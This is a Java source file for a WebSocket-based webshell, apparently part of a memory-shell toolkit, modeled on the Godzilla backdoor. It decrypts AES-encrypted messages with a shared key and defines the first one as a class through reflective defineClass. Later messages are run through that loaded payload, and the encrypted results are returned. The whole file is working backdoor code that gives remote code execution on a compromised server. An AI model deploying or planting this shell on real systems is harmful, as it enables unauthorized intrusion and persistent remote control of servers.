package com.reajason.javaweb.memshell.shelltool.godzilla;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.ByteBuffer;

/**
 * @author ReaJason
 * @since 2025/5/9
 */
public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer> {
    public static String key;

    private Session session;
    private Class<?> payload;

    public Class<?> Q(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        return (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }

    @Override
    public void onMessage(ByteBuffer byteBuffer) {
        try {
            byte[] data = byteBuffer.array();
            data = x(data, false);
            byte[] response = new byte[0];
            if (payload == null) {
                payload = Q(data);
            } else {
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                Object obj = payload.newInstance();
                obj.equals(data);
                obj.equals(bos);
                obj.toString();
                response = bos.toByteArray();
            }
            session.getBasicRemote().sendBinary(ByteBuffer.wrap(x(response, true)));
        } catch (Throwable e) {
            e.printStackTrace();
            try {
                session.close();
            } catch (java.io.IOException ignored) {
            }
        }
    }
}
